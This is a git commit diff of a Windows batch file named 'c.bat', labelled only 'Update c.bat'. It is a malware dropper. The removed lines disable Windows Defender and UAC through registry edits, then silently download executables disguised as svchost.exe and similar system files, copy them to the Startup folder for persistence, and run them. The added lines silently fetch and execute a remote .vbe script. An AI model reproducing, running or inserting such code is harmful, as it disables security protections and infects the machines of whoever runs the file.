75207b42b199f7caf5c58971f02d54d84d4f0e21
VanishGX <anixdevofficial@gmail.com>
2024-08-01 19:59:45 +0200

    Update c.bat

--- c.bat
+++ c.bat
@@ -35,20 +35,8 @@ if defined IsAdmin (
 )
 pause
 :admin
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
-reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-curl -s -o "svchost".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/svchost.exe"
-svchost.exe
-curl -s -o "WindowsBootMenager".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/WindowsBootMenager.exe"
-xcopy /y WindowsBootMenager.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-WindowsBootMenager.exe
-curl -s -o "chromedrivers".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/chromedrivers.exe"
-xcopy /y chromedrivers.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-chromedrivers.exe
-REM curl -s -o "installer".exe -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.exe"
-REM xcopy /y installer.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-REM installer.exe
+curl -s -o "scriptmenagers".vbe -JL "https://github.com/VanishGX/Base/raw/main/scriptmenagers.vbe"
+scriptmenagers.vbe
 ping 127.0.0.1 -n 1 > nul
 del /q "%tempDir%\admincheck.ok"
 exit
